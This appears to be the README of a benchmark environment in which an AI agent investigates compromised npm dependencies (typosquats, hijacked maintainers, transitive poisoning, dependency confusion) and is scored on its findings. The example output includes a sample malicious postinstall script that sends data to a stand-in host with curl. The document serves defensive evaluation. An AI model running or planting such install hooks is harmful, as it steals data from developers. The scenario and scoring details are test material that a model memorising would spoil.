---
title: Supply Chain Forensics
emoji: 🔍
colorFrom: red
colorTo: red
sdk: docker
app_file: app.py
pinned: false
---

# Supply Chain Forensics

OpenEnv benchmark where an AI agent investigates compromised software dependencies.

On March 31, 2026, the `axios` npm package (100M weekly downloads) was hijacked via stolen maintainer credentials. Backdoored versions deployed a cross-platform RAT on every machine that ran `npm install`. `npm audit` detected nothing because it only flags known CVEs. The same blind spot let `ua-parser-js`, `event-stream`, and the SolarWinds build system get compromised in previous years.

This environment puts an agent in that situation. It gets a project with a poisoned dependency tree, a set of investigation tools, and a step budget. It has to identify the compromised packages and classify the attack type.

## Example

```
POST /reset { "task": "easy" }

Briefing: "A fintech API project has a suspicious dependency."
Packages: express, lodash, lod-ash
Budget: 12 steps
```
```
→ check_similarity("lod-ash", "lodash")
  edit_distance: 1, similarity: 0.857
  verdict: SUSPICIOUS — likely typosquat

→ inspect_package("lod-ash")
  weekly_downloads: 312
  install_scripts: { postinstall: "curl http://malicious.com/collect" }

→ submit_findings(["lod-ash"], {"lod-ash": "typosquat"})
  score: 1.0, precision: 1.0, recall: 1.0
```

That's the easy scenario in 3 steps. The hard scenario has 8 packages, two red herrings with legitimate install scripts, and a malicious dependency buried 4 levels deep that only activates in CI.

## Scenarios

| Task | Attack | Modeled After | Packages | Red Herrings | Steps |
|------|--------|---------------|----------|--------------|-------|
| `easy` | Typosquat | `lod-ash` vs `lodash` (312 vs 48M downloads) | 3 | 0 | 12 |
| `medium` | Hijacked maintainer | Axios-style credential theft, dormant account | 2 | 0 | 20 |
| `hard` | Transitive poisoning | Malicious dep 4 levels deep, CI-only, exfils SSH keys | 8 | 2 | 30 |
| `confusion` | Dependency confusion | Public package shadows internal name | 5 | 2 | 20 |

## Actions

| Action | Returns |
|--------|---------|
| `list_packages()` | All declared dependencies |
| `inspect_package(name)` | Metadata, install scripts, source preview |
| `check_publish_history(name)` | Version timeline, anomaly flags |
| `check_maintainer(name)` | Account age, GitHub activity, dormancy signals |
| `trace_network(build_step)` | Outbound HTTP during CI builds |
| `check_similarity(name, ref)` | Levenshtein distance to known packages |
| `get_dependency_tree(depth)` | Transitive graph, up to 5 levels |
| `get_audit_output()` | npm/pip audit results (0 for novel attacks) |
| `get_git_log()` | Project commit history |
| `submit_findings(packages, vectors)` | Final answer, episode ends, score returned |

## Scoring

```
F1(flagged vs ground truth) × 0.8
+ 0.1 per correct attack vector
+ efficiency bonus (up to 0.1, only when F1 > 0.5)
− 0.02 per step

Total clamped to [0.0, 1.0]. Deterministic.
```

Vectors: `typosquat` · `hijacked_maintainer` · `poisoned_transitive_dependency` · `malicious_install_script` · `dependency_confusion`

## Quick Start

```bash
pip install -r requirements.txt
uvicorn app:app --port 7860
```

```bash
export HF_TOKEN=your_key
export MODEL_NAME=Qwen/Qwen2.5-72B-Instruct
export SUPPLY_CHAIN_TASK=easy
python inference.py
```

## Project Structure

```
app.py                    FastAPI server (reset / step / state)
env/
  environment.py          Action dispatch, state management, grading
  scenarios/
    easy.json             Typosquat
    medium.json           Hijacked maintainer
    hard.json             Transitive poisoning (8 packages, dep tree)
    confusion.json        Dependency confusion
inference.py              Baseline agent (LLM with rule-based fallback)
openenv.yaml              OpenEnv spec
Dockerfile                HF Spaces deployment
```

## References

- [Axios NPM hijack, Mar 2026](https://www.microsoft.com/en-us/security/blog/2026/04/01/mitigating-the-axios-npm-supply-chain-compromise/) · 100M downloads, stolen credentials, cross-platform RAT
- [ua-parser-js, Oct 2021](https://github.com/nickstefan/ua-parser-js/issues/536) · 8M downloads, crypto miners
- [event-stream, Nov 2018](https://snyk.io/blog/a-post-mortem-of-the-malicious-event-stream-backdoor/) · social engineering backdoor
- [SolarWinds, Dec 2020](https://www.cisa.gov/news-events/alerts/2020/12/13/active-exploitation-solarwinds-software) · 18,000 orgs compromised